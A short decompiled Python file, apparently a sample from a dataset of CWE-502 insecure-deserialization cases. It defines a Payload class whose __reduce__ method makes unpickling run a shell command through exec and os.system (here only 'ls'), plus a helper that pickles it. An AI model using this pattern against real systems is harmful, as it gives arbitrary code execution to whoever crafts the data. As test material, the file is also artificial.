# uncompyle6 version 3.9.0
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Nov 22 2023, 10:22:35) 
# [GCC 9.4.0]
# Embedded file name: original_files/CWE-502_author_1.py
# Compiled at: 2024-01-25 22:29:32
# Size of source mod 2**32: 290 bytes
import pickle

class Payload(object):

    def __reduce__(self):
        return (
         exec, ('import os;os.system("ls")', ))


def makePickleData(payload: Payload):
    """
    Get serialized data from the payload object and serialize it before returning it
    """
    return pickle.dumps(payload)